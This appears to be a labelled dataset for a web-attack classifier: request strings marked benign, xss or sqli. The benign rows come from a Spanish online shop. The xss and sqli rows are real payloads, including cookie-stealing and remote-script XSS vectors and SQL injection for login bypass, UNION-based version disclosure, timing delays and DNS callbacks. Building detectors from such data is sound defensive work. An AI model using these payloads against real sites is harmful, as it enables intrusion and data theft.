+"<a href=""javas\x0Ccript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+5659,benign
+imagenes/1.gif,benign
+"<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
+"sn(s: select * from users where id=1 or ""$("" or 1=1 -- 1",sqli
+<img/src=@&#32;&#13; onerror = prompt('&#49;'),xss
+"s.(s: select * from users where id=1 or "".("" or 1=1 -- 1",sqli
+<IMG SRC=javascript:alert('XSS')>,xss
+"s.,s: select * from users where id=1 or "".,"" or 1=1 -- 1",sqli
+"admin"") or (""1""=""1""--",sqli
+imagenes/2.gif,benign
+9362,benign
+publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=92&B1=A%F1adir+al+carrito,benign
+"<body onUnload body onUnload=""javascript:javascript:alert(1)""></body onUnload>",xss
+"s1)s: select * from users where id=1 or ""1)"" or 1=1 -- 1",sqli
+.on&1: select * from users where id=1.<@$ or 1=1 -- 1,sqli
+"<script src=""javascript:alert(1)"">",xss
+"<a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:javascript:alert(1)"">XXX</a>",xss
+2 order by 9999,sqli
+"s?n: select * from users where id=1 or ""?["" or 1=1 -- 1",sqli
+"UE1n: select * from users where id=1 union select 1`\`,version() -- 1",sqli
+index.jsp,benign
+necforo,benign
+"s;UEf: select * from users where id=1 or 1#""; union select version(),version() -- 1",sqli
+'^',sqli
+torreblacos,benign
+imagenes/logo.gif,benign
+"n.UEv: select * from users where id=1 +$ . union select null,@@VERSION -- 1",sqli
+"<img \x11src=x onerror=""javascript:alert(1)"">",xss
+miembros/imagenes/ogono.jpg,benign
+"1oUEv: select * from users where id=1 +1<@ union select null,version() -- 1",sqli
+<BODY ONLOAD=alert('XSS')>,xss
+"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1)></a>"">",xss
+"s&(.): select * from users where id='1' or (\.)=1 union select 1,@@VERSION -- 1'",sqli
+admin') or '1'='1,sqli
+"""`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>",xss
+"sUE(1: select * from users where id='1' union select (1),banner from v$version where rownum=1 -- 1'",sqli
+publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=62&B1=A%F1adir+al+carrito,benign
+"</script><img/*%00/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/%00*/onerror='eval(src)'>",xss
+index.jsp,benign
+"<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>",xss
+publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
+"s{1s: select * from users where id=1 or ""{1""=1 or 1=1 -- 1",sqli
+forfoleda,benign
+"s;os: select * from users where id=1 or "";&"" or 1=1 -- 1",sqli
+"s(v: select * from users where id=1 or ""(@"" or 1=1 -- 1",sqli
+"s??s: select * from users where id=1 or ""??"" or 1=1 -- 1",sqli
+publico/pagar.jsp?modo=insertar&precio=2306&B1=Pasar+por+caja,benign
+imagenes/cmenbul.gif,benign
+miramar,benign
+"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",xss
+"<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",xss
+"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",xss
+so.n&: select * from users where id='1' <@.$ or 1=1 -- 1',sqli
+' or ''*',sqli
+deying,benign
+a' order by 1#,sqli
+"<DIV STYLE=""width: expression(alert('XSS'));"">",xss
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,xss
+"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss
+"<script\x20type=""text/javascript"">javascript:alert(1);</script>",xss
+"voUE1: select * from users where id=1 -@<@ union select 1,version() -- 1",sqli
+"s.o1U: select * from users where id=1 or 1#"".=1 union select 1,version() -- 1",sqli
+' or '' ',sqli
+"<IMG SRC=""javascript:alert('XSS')""",xss
+"soos: select * from users where id=1 or ""%&"" or 1=1 -- 1",sqli
+"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>",xss
+"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;""></BODY></HTML>",xss
+"456""%5d|//a|/a%5b""a",sqli
+<a onmouseover=alert(document.cookie)>xxs link</a>,xss
+publico/pagar.jsp?modo=insertar&precio=6684&B1=Pasar+por+caja,benign
+"admin"") or ""1""=""1""#",sqli
+"&1UEv: select * from users where id=1 ||1 union select null,banner from v$version where rownum=1 -- 1",sqli
+"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",xss
+79144797a,benign
+6769,benign
+"so{s: select * from users where id=1 or ""%{"" or 1=1 -- 1",sqli
+"a"" order by 9999-- #",sqli
+"<script src=""data:text/javascript,alert(1)""></script>",xss
+"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
+"<IMG DYNSRC=""javascript:javascript:alert(1)"">",xss
+<embed code=javascript:javascript:alert(1);></embed>,xss
+"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",xss
+publico/autenticar.jsp?modo=entrar&login=holdaway&pwd=TAbuRETe&remember=on&B1=Entrar,benign
+1&1c: select * from users where id=1 +1 or 1=1 -- 1,sqli
+miembros/index.jsp,benign
+publico/miembros.jsp,benign
+saviange_files@zytel.nc,benign
+"c/ fuente del peral 41,",benign
+"'`""><\x3Cscript>javascript:alert(1)</script>",xss
+"sUE(.: select * from users where id='1' union select (\.),@@VERSION -- 1'",sqli
+"<a href=""\x0Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"sUE,v: select * from users where id='1' union select \,@@VERSION -- 1'",sqli
+"""/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />",xss
+"<script src=""/\%(jscript)s""></script>",xss
+"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
+global/creditos.jsp,benign
+"c/ virgen de la almudena, 61 12?c",benign
+"sov1o: select * from users where id='1' + @ 1! union select 1,version() -- 1'",sqli
+trigueros del valle,benign
+"s1n: select * from users where id=1 or ""1["" or 1=1 -- 1",sqli
+"<img\x47src=x onerror=""javascript:alert(1)"">",xss
+"s&vvU: select * from users where id='1' or @ @1=1 union select 1,version() -- 1'",sqli
+"<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",xss
+"<img src\x10=x onerror=""javascript:alert(1)"">",xss
+"s.n: select * from users where id=1 or "".["" or 1=1 -- 1",sqli
+<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,xss
+16340,benign
+".UE1,: select * from users where id=1.  union select 1,version() -- 1",sqli
+publico/pagar.jsp?modo=insertar&precio=7205&B1=Confirmar,benign
+85802086b,benign
+<object onerror=javascript:javascript:alert(1)>,xss
+"""'`><\x00img src=xxx:x onerror=javascript:alert(1)>",xss
+37130,benign
+"&onUE: select * from users where id=1 or \<$ union select 1,@@VERSION -- 1",sqli
+index.jsp,benign
+a' order by 1--,sqli
+"s:(s: select * from users where id=1 or "":(""=1 or 1=1 -- 1",sqli
+"s.UEs: select * from users where id=1 or 1#"". union select 'a',version() -- 1",sqli
+".)UEv: select * from users where id=1 + (\.) union select null,@@VERSION -- 1",sqli
+"&(1)o: select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1",sqli
+<embed code=%(scriptlet)s></embed>,xss
+"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",xss
+"s;1s: select * from users where id=1 or "";1"" or 1=1 -- 1",sqli
+"snv: select * from users where id=1 or ""$@"" or 1=1 -- 1",sqli
+imagenes/cmenbul.gif,benign
+"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF ",xss
+"s(c: select * from users where id=1 or ""(#"" or 1=1 -- 1",sqli
+"`""'><img src=xxx:x onerror\x20=javascript:alert(1)>",xss
+imagenes/cmenbul.gif,benign
+"sUE1k: select * from users where id='1' union select 1,banner from v$version where rownum=1 -- 1'",sqli
+imagenes/logo.gif,benign
+<iframe src=%(scriptlet)s <,xss
+<<SCRIPT>%(payload)s//<</SCRIPT>,xss
+s&o.&: select * from users where id='1' or \<\. or 1=1 -- 1',sqli
+"&(.)o: select * from users where id=1 or (\.)=1 union select 1,@@VERSION -- 1",sqli
+"s&1oo: select * from users where id='1' or 1^=1 union select 1,banner from v$version where rownum=1 -- 1'",sqli
+<STYLE>@import'%(css)s';</STYLE>,xss
+"<IMG STYLE=""xss:expr/*XSS*/ession(javascript:alert(1))"">",xss
+publico/miembros.jsp,benign
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss
+"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X",xss
+<script>javascript:alert(1)<\x00/script>,xss
+publico/miembros.jsp,benign
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,xss
+"""`'><script>\xE2\x80\x84javascript:alert(1)</script>",xss
+7150,benign
+miembros/imagenes/castro.jpg,benign
+"`""'><img src=xxx:x \x0Conerror=javascript:alert(1)>",xss
+"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",xss
+"<a  href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click  Me</a>",xss
+"s:&1c: select * from users where id=1 or 1#"": or 1=1 -- 1",sqli
+global/titulo.jsp,benign
+".UEf(: select * from users where id=1.  union select version(),version() -- 1",sqli
+"admin"" or ""1""=""1",sqli
+"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
+<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,xss
+"snc: select * from users where id=1 or ""$#"" or 1=1 -- 1",sqli
+"<img src=x onerror=\x12""javascript:alert(1)"">",xss
+<script>javascript:alert(1)</script>,xss
+miembros/imagenes/castro.jpg,benign
+"s&n.o: select * from users where id='1' or $ .=1 union select 1,@@VERSION -- 1'",sqli
+"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",xss
+"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",xss
+"noonU: select * from users where id=1 + $+*$ union select null,@@VERSION -- 1",sqli
+"<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(1)""></iframe onbeforeload>",xss
+"admin"" #",sqli
+vilma,benign
+"s;,s: select * from users where id=1 or "";,""=1 or 1=1 -- 1",sqli
+"son: select * from users where id=1 or ""%["" or 1=1 -- 1",sqli
+publico/productos.jsp,benign
+<iframe/%00/ src=javaSCRIPT&colon;alert(1),xss
+<%<!--'%><script>alert(1);</script -->,xss
+3.35E+15,benign
+"<svg onunload svg onunload=""javascript:javascript:alert(1)""></svg onunload>",xss
+"<video onerror=""javascript:javascript:alert(1)""><source>",xss
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',xss
+"s:?s: select * from users where id=1 or "":]"" or 1=1 -- 1",sqli
+"1UE1k: select * from users where id=1 +1 union select 1,banner from v$version where rownum=1 -- 1",sqli
+"345"")%5d|//*|/a%5bcontains(a,""b",sqli
+"<frameset onBlur frameset onBlur=""javascript:javascript:alert(1)""></frameset onBlur>",xss
+.&1c: select * from users where id=1. or 1=1 -- 1,sqli
+")UEvc: select * from users where id=1 +(\) union select null,@@VERSION -- 1",sqli
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,xss
+"a"" or ""dfth""=""dfth""-- #",sqli
+"1ooUE: select * from users where id=1 + \+*\ union select null,@@VERSION -- 1",sqli
+<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>,xss
+publico/carrito.jsp,benign
+<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss
+"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",xss
+"sUE.,: select * from users where id='1' union select \.,@@VERSION -- 1'",sqli
+"<script onReadyStateChange script onReadyStateChange=""javascript:javascript:alert(1)""></script onReadyStateChange>",xss
+eu,benign
+"<a href=""javas\x03cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<iframe  src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
+1o)&1: select * from users where id=1 + (\+) or 1=1 -- 1,sqli
+"<img[a][b][c]src[d]=x[e]onerror=[f]""alert(1)"">",xss
+"<div style=""font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"">X",xss
+global/menum.jsp,benign
+publico/vaciar.jsp?B2=Vaciar+carrito,benign
+"s&n1U: select * from users where id='1' or $ 1=1 union select 1,@@VERSION -- 1'",sqli
+navas de jorquera,benign
+15317,benign
+"<object onbeforeload object onbeforeload=""javascript:javascript:alert(1)""></object onbeforeload>",xss
+"sv:s: select * from users where id=1 or ""@:""=1 or 1=1 -- 1",sqli
+publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=15&B1=A%F1adir+al+carrito,benign
+"`""'><img src=xxx:x onerror\x0B=javascript:alert(1)>",xss
+"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",xss
+"<body onLoad body onLoad=""javascript:javascript:alert(1)""></body onLoad>",xss
+"s.ns: select * from users where id=1 or ""._"" or 1=1 -- 1",sqli
+"os: select * from users where id=1 <@$$ union select 1,version() -- 1",sqli
+"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",xss
+"sov(1: select * from users where id='1' + @(1) union select 1,version() -- 1'",sqli
+"<img src=# onerror\x3D""javascript:alert(1)"" >",xss
+"admin"") or ""1""=""1""/*",sqli
+miembros/imagenes/castro.jpg,benign
+no)&1: select * from users where id=1 + ($+) or 1=1 -- 1,sqli
+<script\x0C>javascript:alert(1)</script>,xss
+"noo1U: select * from users where id=1 + $+%1 union select null,@@VERSION -- 1",sqli
+"<svg onUnload svg onUnload=""javascript:javascript:alert(1)""></svg onUnload>",xss
+"so1&1: select * from users where id='1' + 1||1 union select 1,banner from v$version where rownum=1 -- 1'",sqli
+o.n&1: select * from users where id=1 <@.$ or 1=1 -- 1,sqli
+"456')%5d|//a|/a%5bcontains(a,'b",sqli
+imagenes/cmenbul.gif,benign
+publico/miembros.jsp,benign
+no.&1: select * from users where id=1 +$+. or 1=1 -- 1,sqli
+publico/caracteristicas.jsp?id=1,benign
+"s{os: select * from users where id=1 or ""{%"" or 1=1 -- 1",sqli
+"\"";alert('XSS');//",xss
+imagenes/logo.gif,benign
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,xss
+"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
+"<a href=""\x04javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"snn: select * from users where id=1 or ""$["" or 1=1 -- 1",sqli
+s&.o&: select * from users where id='1' or \.<\ or 1=1 -- 1',sqli
+"ABC<div style=""x:\xE2\x80\x81expression(javascript:alert(1)"">DEF",xss
+"s;UEv: select * from users where id=1 or 1#""; union select null,version() -- 1",sqli
+imagenes/3.gif,benign
+"s?UE1: select * from users where id=1 or 1#""? union select 1,version() -- 1",sqli
+1 waitfor delay '0:0:X'--,sqli
+"1)UEv: select * from users where id=1 +(1) union select null,banner from v$version where rownum=1 -- 1",sqli
+lu,benign
+5366,benign
+1); waitfor delay '0:0:X'--,sqli
+on&1c: select * from users where id=1 <@$ or 1=1 -- 1,sqli
+"s1{s: select * from users where id=1 or ""1{"" or 1=1 -- 1",sqli
+"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
+"1' or benchmark(100000000,MD5(1))#",sqli
+<body/onload=&lt;!--&gt;&#10alert(1)>,xss
+"<a href=""\x0Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
+global/titulo.jsp,benign
+<script\x09>javascript:alert(1)</script>,xss
+index.jsp,benign
+"sn:s: select * from users where id=1 or ""$:"" or 1=1 -- 1",sqli
+valido casademont,benign
+36823414t,benign
+siefert,benign
+"s1UEs: select * from users where id=1 or 1#""1 union select 'a',version() -- 1",sqli
+admin' or '1'='1'/*,sqli
+<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X,xss
+6.19E+15,benign
+miembros/salir.jsp,benign
+"1oUE1: select * from users where id=1 -1<@ union select 1,version() -- 1",sqli
+imagenes/1.gif,benign
+"<a href=""\x02javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+vidrioso,benign
+<iframe/onreadystatechange=alert(1),xss
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss
+"<img src\x47=x onerror=""javascript:alert(1)"">",xss
+<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>,xss
+dziawa,benign
+"so.s: select * from users where id=1 or ""%."" or 1=1 -- 1",sqli
+"s;:s: select * from users where id=1 or "";:""=1 or 1=1 -- 1",sqli
+"<body onblur body onblur=""javascript:javascript:alert(1)""></body onblur>",xss
+"""/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />",xss
+publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
+"""`'><script>\x00javascript:alert(1)</script>",xss
+"<img src=x\x09onerror=""javascript:alert(1)"">",xss
+"s:os: select * from users where id=1 or "":%"" or 1=1 -- 1",sqli
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,xss
+"ooUE1: select * from users where id=1<@<@ union select 1,version() -- 1",sqli
+"&(1UE: select * from users where id=1 or (\+)=1 union select 1,@@VERSION -- 1",sqli
+"1oonU: select * from users where id=1 + \+*$ union select null,@@VERSION -- 1",sqli
+"<form><isindex formaction=""javascript&colon;confirm(1)""",xss
+"<SCRIPT/SRC=""%(jscript)s""></SCRIPT>",xss
+"<html onMouseEnter html onMouseEnter=""javascript:parent.javascript:alert(1)""></html onMouseEnter>",xss
+"<style></style\x09<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
+n.&1c: select * from users where id=1 +$ . or 1=1 -- 1,sqli
+miembros/salir.jsp,benign
+<STYLE>@import'%(css)s';</STYLE>,xss
+imagenes/2.gif,benign
+1')); waitfor delay '0:0:X'--,sqli
+".&vUE: select * from users where id=1.&&@ union select 1,version() -- 1",sqli
+"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-",xss
+"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
+40355743n,benign
+miembros/index.jsp,benign
+"<LINK REL=""stylesheet"" HREF=""javascript:javascript:alert(1);"">",xss
+pingajosa,benign
+"sUE(): select * from users where id='1' union select (\),@@VERSION -- 1'",sqli
+"<IMG SRC=javascript:alert(""XSS"")>",xss
+"&noo1: select * from users where id=1 or $+<1 union select 1,@@VERSION -- 1",sqli
+ulrico,benign
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>,xss
+"ABC<div style=""x:\xE2\x80\x8Aexpression(javascript:alert(1)"">DEF",xss
+"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",xss
+"s&()o: select * from users where id='1' or (\)=1 union select 1,@@VERSION -- 1'",sqli
+"s&no.: select * from users where id='1' or $<\. union select 1,@@VERSION -- 1'",sqli
+".UE1k: select * from users where id=1. union select 1,banner from v$version where rownum=1 -- 1",sqli
+duesaiges,benign
+"ABC<div style=""x:\x0Cexpression(javascript:alert(1)"">DEF",xss
+"""`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>",xss
+imagenes/2.gif,benign
+"""`'><script>\xE2\x80\x81javascript:alert(1)</script>",xss
+<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},xss
+"<embed type=""image"" src=%(scriptlet)s></embed>",xss
+"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",xss
+2/0 and 456=678,sqli
+publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=83&B1=A%F1adir+al+carrito,benign
+"<a href=""jav&#97ascript:javascript:alert(1)"">test1</a>",xss
+"o.nUE: select * from users where id=1 <@.$ union select 1,version() -- 1",sqli
+a'or/*g*/345=345-- #,sqli
+"<script src=""data:\xE0\xA4\x98,javascript:alert(1)""></script>",xss
+miembros/imagenes/castro.jpg,benign
+<img src=`xx:xx`onerror=alert(1)>,xss
+<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ​,xss
+"voUEf: select * from users where id=1 -@<@ union select version(),version() -- 1",sqli
+"admin"") or (""1""=""1""#",sqli
+alkin@lesionesmusculares.pf,benign
+"o1UEv: select * from users where id=1 *1 union select null,banner from v$version where rownum=1 -- 1",sqli
+"s&o1U: select * from users where id='1' or !<1 union select 1,version() -- 1'",sqli
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,xss
+"<a href=""javas\x0Bcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"s{:s: select * from users where id=1 or ""{:"" or 1=1 -- 1",sqli
+"<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>",xss
+"&n.o1: select * from users where id=1 or $ .=1 union select 1,@@VERSION -- 1",sqli
+"&.oUE: select * from users where id=1 or \.<\ union select 1,@@VERSION -- 1",sqli
+"s{c: select * from users where id=1 or ""{#"" or 1=1 -- 1",sqli
+"<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>",xss
+<script\x0D>javascript:alert(1)</script>,xss
+publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
+"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",xss
+"<var onmouseover=""prompt(1)"">On Mouse Over</var>",xss
+miembros/fotos.jsp,benign
+<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,xss
+imagenes/nuestratierra.jpg,benign
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},xss
+"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss
+"UE1nn: select * from users where id=1 union select .1$_,version() -- 1",sqli
+imagenes/cmenbul.gif,benign
+"<SCRIPT SRC=""%(jpg)s""></SCRIPT>",xss
+"sv(s: select * from users where id=1 or ""@("" or 1=1 -- 1",sqli
+"<xml id=""xss"" src=""%(htc)s""></xml> <label dataformatas=""html"" datasrc=""#xss"" datafld=""payload""></label>",xss
+' or ''^',sqli
+</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,xss
+publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=66&B1=A%F1adir+al+carrito,benign
+"sn: select * from users where id='1' union select ""[""_,version() -- 1'",sqli
+"s&noU: select * from users where id='1' or $<\ union select 1,@@VERSION -- 1'",sqli
+or 1=1/*,sqli
+"<IMG LOWSRC=""javascript:alert('XSS')"">",xss
+lesaca clar,benign
+s&o1&: select * from users where id='1' or \<1 or 1=1 -- 1',sqli
+"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",xss
+"<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(1)//#"">XXX</a></body>",xss
+"<XSS STYLE=""behavior: url(xss.htc);"">",xss
+"<IMG LOWSRC=""javascript:javascript:alert(1)"">",xss
+index.jsp,benign
+imagenes/3.gif,benign
+1/(select UTL_INADDR.get_host_address('n0where329.z0m') from dual)--,sqli
+a' order by 9999-- #,sqli
+"s?os: select * from users where id=1 or ""?%"" or 1=1 -- 1",sqli
+"UEo1,: select * from users where id=1 union select !<1,version() -- 1",sqli
+"snUEs: select * from users where id=1 or 1#""$ union select 'a',version() -- 1",sqli
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss
+"<a href=""javas\x01cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+<--`<img/src=` onerror=alert(1)> --!>,xss
+"oovUE: select * from users where id=1 <@&@ union select 1,version() -- 1",sqli
+"<a href=""\x03javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<div style=""font-family:foo}color=red;"">XXX",xss
+<svg contentScriptType=text/vbs><script>MsgBox+1,xss
+".UEv,: select * from users where id=1. union select null,version() -- 1",sqli
+"<a href=""javas\x07cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"UEvkn: select * from users where id=1   union select null,banner from v$version where rownum=1 -- 1",sqli
+"s,:s: select * from users where id=1 or "",:""=1 or 1=1 -- 1",sqli
+" or ""*",sqli
+5.66E+15,benign
+"<LAYER SRC=""%(scriptlet)s""></LAYER>",xss
+"ABC<div style=""x:\xE2\x80\x84expression(javascript:alert(1)"">DEF",xss
+publico/caracteristicas.jsp?id=2,benign
+"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",xss
+"<img src\x13=x onerror=""javascript:alert(1)"">",xss
+publico/productos.jsp,benign
+publico/caracteristicas.jsp?id=2,benign
+"<div/onmouseover='alert(1)'> style=""x:"">",xss
+"UEvn,: select * from users where id=1 union select @ _,version() -- 1",sqli
+badajoz,benign
+publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
+38821598j,benign
+index.jsp,benign
+"<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">",xss
+"<body onMouseEnter body onMouseEnter=""javascript:javascript:alert(1)""></body onMouseEnter>",xss
+"<a href=""\x0Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
+"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",xss
+imagenes/2.gif,benign
+"c/ venus 91, 1e",benign
+a' and '456'='678,sqli
+"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",xss
+publico/caracteristicas.jsp?id=2,benign
+"s?:s: select * from users where id=1 or ""]:"" or 1=1 -- 1",sqli
+"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",xss
+)&1c: select * from users where id=1 +(\) or 1=1 -- 1,sqli
+<script>/* *\x2A/javascript:alert(1)// */</script>,xss
+miembros/imagenes/castro.jpg,benign
